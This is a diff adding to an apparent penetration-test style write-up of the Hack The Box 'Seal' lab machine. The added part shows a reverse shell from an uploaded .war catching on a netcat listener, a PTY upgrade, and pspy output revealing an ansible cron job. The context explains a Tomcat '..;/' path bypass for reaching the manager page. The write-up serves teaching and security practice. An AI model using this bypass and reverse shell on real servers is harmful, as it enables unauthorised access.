@@ -134,13 +134,64 @@ manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 30m
 :: Progress: [81630/81630] :: Job [1/1] :: 480 req/sec :: Duration: [0:02:13] :: Errors: 0 ::
 ```
 
-The Tomcat service has the ability to deploy a .war file, which could be used to upload a malicious payload however the directory was blocked.
+The Tomcat service has the "WAR file to deploy" feature to deploy a .war file, which could be used to upload a malicious payload however the directory was blocked.
 
 The tester was able to access it by abusing tomcat path normalisation. This feature normalises URL paths, however by entering the characters "/test/..;/" the Nginx reverse proxy will not normalise the path correctly and parse "../" therefore the requested page will be served therefore by entering the URL "https://seal.htb/manager/test/..;/html" the server will actually return "https://seal.htb/manager/html" bypassing the restriction. This works to access the manager page however requires more work to upload a ".war" file. The tester had to intercept the post request with burp suite and change the post URL to the bypass the address with the double period and a semicolon.  
 
 
 ![web_error](https://private-user-images.githubusercontent.com/63368388/285900777-51dad20f-c45f-4952-88dd-c7318ab0069c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTEiLCJleHAiOjE3MDEwOTQ3NTEsIm5iZiI6MTcwMTA5NDQ1MSwicGF0aCI6Ii82MzM2ODM4OC8yODU5MDA3NzctNTFkYWQyMGYtYzQ1Zi00OTUyLTg4ZGQtYzczMThhYjAwNjljLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFJV05KWUFYNENTVkVINTNBJTJGMjAyMzExMjclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjMxMTI3VDE0MTQxMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWEzODlmYjk5ODgzZDFmN2M4MmI1OGFiMzk2MzUzOGQyNGQ1OTc2MjJmODZhMDY0OGE0MTU5ODI5Zjk2NjE0NzYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.SKic49GtzK-MompbSwuBjZ_ycukZz2iEzfQjk94QOBE)
 
+Once the malicious file was uploaded the tester navigated to https://seal.htb/revshell/ which executed the shell connecting it to the netcat listener. 
+
+```
+┌─[rang3r@parrot]─[~]
+└──╼ $nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.250] 37552
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+tomcat@seal:/var/lib/tomcat9$ ^Z
+[1]+  Stopped                 nc -lnvp 1337
+┌─[✗]─[rang3r@parrot]─[~]
+└──╼ $stty raw -echo
+┌─[rang3r@parrot]─[~]
+nc -lnvp 1337
+
+tomcat@seal:/var/lib/tomcat9$ export TERM=xterm
+tomcat@seal:/var/lib/tomcat9$ id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
+tomcat@seal:/var/lib/tomcat9$ hostname
+seal
+tomcat@seal:/var/lib/tomcat9$ 
+```
+The tester used the "pspy" tool to monitor the system processes 
+```
+tomcat@seal:/tmp$ ./pspy64 
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+<snip>
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2023/11/27 14:27:21 CMD: UID=997   PID=245280 | ./pspy64 
+2023/11/27 14:27:21 CMD: UID=0     PID=245271 | sleep 30 
+2023/11/27 14:27:21 CMD: UID=0     PID=245270 | /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
+2023/11/27 14:27:21 CMD: UID=0     PID=245269 | /usr/sbin/CRON -f 
+
+<snip>
+
+2023/11/27 14:27:31 CMD: UID=1000  PID=245293 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
+2023/11/27 14:27:31 CMD: UID=1000  PID=245295 | 
+2023/11/27 14:27:32 CMD: UID=1000  PID=245296 | 
+2023/11/27 14:27:32 CMD: UID=1000  PID=245300 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
+2023/11/27 14:27:32 CMD: UID=1000  PID=245301 | 
+2023/11/27 14:27:32 CMD: UID=1000  PID=245302 | /bin/sh -c /bin/sh -c 'echo ~luis && sleep 0' 
+2023/11/27 14:27:32 CMD: UID=1000  PID=245304 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
+2023/11/27 14:27:32 CMD: UID=1000  PID=245305 | 
+
+<snip>
+
+```
 
 ## Mitigations 
 
